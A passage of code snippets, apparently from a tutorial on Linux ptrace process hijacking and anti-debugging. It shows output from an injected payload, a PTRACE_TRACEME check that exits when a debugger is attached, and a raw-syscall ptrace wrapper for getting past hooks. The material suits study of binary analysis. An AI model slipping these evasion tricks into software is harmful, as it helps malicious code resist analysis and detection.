payload\n    I am the payload who has hijacked your process!\n    [1]+ Done ./host\n\n    ```", "```\nptrace to find out whether your program is already being traced:\n```", "```\nif (ptrace(PTRACE_TRACEME, 0) < 0) {\nprintf(\"This process is being debugged!!!\\n\");\nexit(1);\n}\n```", "```\n#define SYS_PTRACE 101\nlong my_ptrace(long request, long pid, void *addr, void *data)\n{\n   long ret;\n    __asm__ volatile(\n    \"mov %0, %%rdi\\n\"\n    \"mov %1, %%rsi\\n\"\n    \"mov %2, %%rdx\\n\"\n    \"mov %3, %%r10\\n\"\n    \"mov $SYS_PTRACE, %%rax\\n\"\n    \"syscall\" : : \"g\"(request), \"g\"(pid),\n    \"g\"(addr), \"g\"(data));\n    __asm__ volatile(\"mov %%rax, %0\" : \"=r\"(ret));\n    return ret;\n}\n```"]